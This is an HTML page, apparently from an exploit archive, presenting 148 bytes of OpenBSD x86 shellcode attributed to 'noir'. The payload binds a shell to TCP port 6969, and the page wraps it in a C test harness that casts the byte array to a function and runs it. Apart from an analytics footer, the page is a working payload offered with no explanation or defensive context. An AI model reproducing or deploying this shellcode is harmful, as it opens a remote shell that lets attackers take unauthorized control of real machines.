<html><head><title>OpenBSD/x86 - portbind port 6969 - 148 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 shell on port 6969/tcp shellcode for OpenBSD by noir
 */

#include &lt;stdio.h&gt;
long shellcode[]=
{
  0x4151c931,0x51514151,0x61b0c031,0x078980cd,
  0x4f88c931,0x0547c604,0x084f8902,0x0647c766,
  0x106a391b,0x5004478d,0x5050078b,0x68b0c031,
  0x016a80cd,0x5050078b,0x6ab0c031,0xc93180cd,
  0x078b5151,0xc0315050,0x80cd1eb0,0xc9310789,
  0x50078b51,0xb0c03150,0x4180cd5a,0x7503f983,
  0x5b23ebef,0xc9311f89,0x89074b88,0x8d51044f,
  0x078b5007,0xc0315050,0x80cd3bb0,0x5151c931,
  0x01b0c031,0xd8e880cd,0x2fffffff,0x2f6e6962,
  0x90416873
};

int
main(void)
{
  void (*f) (void);

  f =(void *) shellcode;
  //printf(&quot;shellcode len: %d\n&quot;, strlen(shellcode));

  f();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
